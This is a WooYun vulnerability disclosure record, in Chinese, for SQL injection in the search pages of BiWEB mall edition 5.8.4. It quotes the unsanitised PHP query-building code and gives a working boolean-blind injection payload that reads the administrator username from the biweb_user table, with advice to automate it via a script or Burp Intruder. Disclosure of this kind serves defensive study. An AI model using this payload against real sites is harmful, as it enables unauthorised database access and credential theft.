{"id": 43402, "wybug_id": "wooyun-2014-082835", "wybug_title": "BiWEB最新商城版搜索型注入多枚", "wybug_corp": "BiWEB", "wybug_author": "路人甲", "wybug_date": "2014-11-13 15:29", "wybug_open_date": "2015-02-11 15:30", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： BiWEB最新商城版搜索型注入多枚 详细说明：  在wooyun上看到了有人提了BiWEB的一个XSS漏洞： WooYun: BIWEB商城版XSS盲打cookie ，也有人提了SQL注入，我也来找找它的漏洞吧。去官网下BiWEB商城版最新的5.8.4来看看。发现BiWEB有多处搜索，都存在注入漏洞。看看搜索处是怎么处理的。BiWEB首先对GET和POST进行了过滤，/config/filtrate.inc.php\n<?php//过滤GET或POST的值，去除两端空格和转义符号if ($_SERVER['REQUEST_METHOD'] == 'POST'){\tcheck::filtrateData($_POST,$arrGPdoDB['htmlspecialchars']);}elseif($_SERVER['REQUEST_METHOD'] == 'GET'){\tcheck::filtrateData($_GET,$arrGPdoDB['htmlspecialchars']);}?>\n这里就先不说这种过滤的脑残之处了。继续往下看，BiWEB有所有搜索处都存在同样的注入问题。举一例来说。/search.php\n无关代码if(!empty($_REQUEST['keywords'])){\t$strKeywords = strval(urldecode($_REQUEST['keywords']));\tif($strKeywords[0] == '/'){\t\t//精确查询ID\t\t$strKeywords = substr($strKeywords,1);\t\tif(is_numeric($strKeywords)) $arrWhere[] = \"id = '\" . $strKeywords . \"'\";\t}else{\t\t$arrKeywords = explode(' ', $strKeywords);\t\tforeach($arrKeywords as $v){\t\t\t$v = trim($v);\t\t\tif(!empty($v)){\t\t\t\tif (isset($_GET['radio'])){\t\t\t\t\t$intTemp = intval($_GET['radio']);\t\t\t\t\tswitch($intTemp){\t\t\t\t\t\tcase 0:\t\t\t\t\t\t\t$arrWhere[] = \"brand LIKE '%$v%'\";\t\t\t\t\t\t\t$arrWhere[] = \"model LIKE '%$v%'\";\t\t\t\t\t\t\t$arrWhere[] = \"code LIKE '%$v%'\";\t\t\t\t\t\t\t$arrWhere[] = \"title LIKE '%$v%'\";\t\t\t\t\t\t\tbreak;\t\t\t\t\t\tcase 1:\t\t\t\t\t\t\t$arrWhere[] = \"brand LIKE '%$v%'\";\t\t\t\t\t\t\tbreak;\t\t\t\t\t\tcase 2:\t\t\t\t\t\t\t$arrWhere[] = \"model LIKE '%$v%'\";\t\t\t\t\t\t\tbreak;\t\t\t\t\t\tcase 3:\t\t\t\t\t\t\t$arrWhere[] = \"code LIKE '%$v%'\";\t\t\t\t\t\t\tbreak;\t\t\t\t\t\tcase 4:\t\t\t\t\t\t\t$arrWhere[] = \"title LIKE '%$v%'\";\t\t\t\t\t\t\tbreak;\t\t\t\t\t}\t\t\t\t\t$arrLink[] = 'radio=' . $intTemp;\t\t\t\t}else $arrWhere[] = \"title LIKE '%$v%'\";\t\t\t}\t\t}\t}\t$arrLink[] = 'keywords=' . urlencode($strKeywords);}else check::AlertExit(\"错误：关键词必须填写!\",-1);$strWhere = '';$strWhere = implode(' or ',$arrWhere);$strWhere = 'where pass=1 and '.$strWhere;$arrInfoList = $objWebInit->getInfoList($strWhere, ' ORDER BY submit_date DESC',($intPage-1)*$arrGPage['page_size'],$arrGPage['page_size'],true);$intRows = $arrInfoList['COUNT_ROWS'];unset($arrInfoList['COUNT_ROWS']);无关代码\n通过$_REQUEST来获得keywords继续去看看getInfoList()，在/web_common5.8/php_common.php\nfunction getInfoList($where='',$order='',$intStartID = 0,$intListNum = 0,$field = '*',$arrData = array(),$blCount = true,$blComplex = false){\t\t$table = $this->tablename2;\t\t$arrData=(empty($arrData)?array():$arrData);\t\t$limit = '';\t\tif($blComplex){\t\t\tif($where != '') $where .= \" and id <= ( SELECT id FROM `$table` $order LIMIT $intStartID, 1 )\";\t\t\telse $where = \" where id <= ( SELECT id FROM `$table` $order LIMIT $intStartID, 1 )\";\t\t}\t\tif (!empty($order)) {\t\t\t$limit .= $order;\t\t}\t\tif (!empty($intListNum)) $limit .= \" LIMIT \" . $intStartID .','. $intListNum;\t\t$blFetch = false;\t\tif($field === true) {\t\t\tunset($this->arrGPdoDB['db_table_field']['structon_tb']);\t\t\t$field = implode(',',array_keys($this->arrGPdoDB['db_table_field']));\t\t}\t\t$arrData = $this->selectDataG($table,$where,$limit,$field,$blFetch,$arrData,$blCount);\t\tif(isset($arrData[0]['structon_tb'])) $arrData = $this->loadTableFieldG($arrData);\t\treturn $arrData;\t}\n然后调用同一文件中的electDataG()\nfunction selectDataG($table,$where = '',$limit = '',$field = '*',$blFetch = false,$arrData = array(),$blCount = false,$blComplex = false ){\t\ttry {\t\t\t//$strSQL = \"SELECT SQL_CALC_FOUND_ROWS $field from $table $where\";\t\t效率低下,在MYSQL版本未改进之前弃用\t\t\t$strSQL = \"SELECT $field from $table $where $limit\";\t\t\tif($this->arrGPdoDB['PDO_CACHE']) {\t\t\t\t$strCacheName = md5($strSQL);\t\t\t\t$strCacheDir = '';\t\t\t\tfor($i=0;$i<32;$i+=2){\t\t\t\t\t$strCacheDir .= '/'.$strCacheName[$i].$strCacheName[$i+1];\t\t\t\t}\t\t\t\t$strCacheName = $strCacheDir.'SQL_'.$table.'_'.$strCacheName;\t\t\t\t$strCacheFile = $this->arrGPdoDB['PDO_CACHE_ROOT'].'/'.$strCacheName;\t\t\t\t$objCache = new cache($strCacheFile,$this->arrGPdoDB['PDO_CACHE_LIFETIME']);\t\t\t\tif($this->arrGPdoDB['PDO_CACHE']==1) {\t\t\t\t\tif($objCache->cache_is_active()) {\t\t\t\t\t\tinclude($strCacheFile);\t\t\t\t\t\tif($arr['COUNT_ROWS'] != '' ) $_SESSION['COUNT_ROWS'] = $arr['COUNT_ROWS'];\t\t\t\t\t\telse $arr['COUNT_ROWS'] = $_SESSION['COUNT_ROWS'];\t\t\t\t\t\treturn $arr;\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t\tif($this->arrGPdoDB['PDO_DEBUG']) echo $strSQL.'<br><br>';\t\t\t$rs = $this->db->prepare($strSQL);\t\t\t$rs->execute($arrData);\t\t\tif($blFetch) $arr = $rs->fetch();\t\t\telse  $arr = $rs->fetchAll();\t\t\t$rs = '';\t\t\tif($blCount){\t\t\t\t\t//$strSQL = \"SELECT FOUND_ROWS()\";\t\t配合SQL_CALC_FOUND_ROWS使用的\t\t\t\t\t//$strSQL = \"SELECT count(DISTINCT id) from $table $where\";\t\t\t\t\tif(!$blComplex){\t\t\t\t\t\t$strSQL = \"SELECT count(*) as num from $table $where\";\t\t\t\t\t\tif($this->arrGPdoDB['PDO_DEBUG']) echo $strSQL.'<br><br>';\t\t\t\t\t\t$rs = $this->db->query($strSQL);\t\t\t\t\t\tif(strpos($where,'GROUP') || strpos($where,'group')){\t\t\t\t\t\t\t$arrTemp = $rs->fetchAll();\t\t\t\t\t\t\t$arr['COUNT_ROWS'] = count($arrTemp);\t\t\t\t\t\t}else{\t\t\t\t\t\t\t$arrTemp = $rs->fetch();\t\t\t\t\t\t\t$arr['COUNT_ROWS'] = $arrTemp['num'];\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t\tif($arr['COUNT_ROWS'] != '' ) $_SESSION['COUNT_ROWS'] = $arr['COUNT_ROWS'];\t\t\t\t\telse $arr['COUNT_ROWS'] = $_SESSION['COUNT_ROWS'];\t\t\t}\t\t\tif($this->arrGPdoDB['PDO_CACHE']){\t\t\t\tif(isset($objCache)&&is_object($objCache)) {\t\t\t\t\t$somecontent = '<?php' . \"\\n\" . '$arr = ' . var_export( $arr, true ) . ';' . \"\\n\" . '?>';\t\t\t\t\t$objCache->write_file($somecontent);\t\t\t\t}\t\t\t}\t\t\treturn $arr;\t\t} catch (PDOException $e) {\t\t\techo $strSQL.'<br><br>';\t\t    echo 'Failed: ' . $e->getMessage().'<br><br>';\t\t}\t}\n在整个过程中没有对keywords进行任何过滤，当然，那个脑残的全局过滤直接就可以无视了。所以造成了注入。本次测试是基于bool-based blind做的测试，payload如下Payload:\n%%'/**/and/**/mid((select/**/user_name/**/from/**/biweb_user/**/limit/**/0,1),1,1)='a'/**/and/**/'%'='\n当biweb_user中的第一个管理员的用户名的第一个字母是’a’时，返回如下图\n\n若不是’a’，则返回如下图\n\n注入成功时，SQL的执行情况如下图\n\n可以写个脚本跑，也可以使用burp的intruder来跑，根据返回内容的长度不同，就可以判断了。经测试，管理员用户名为admin。   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}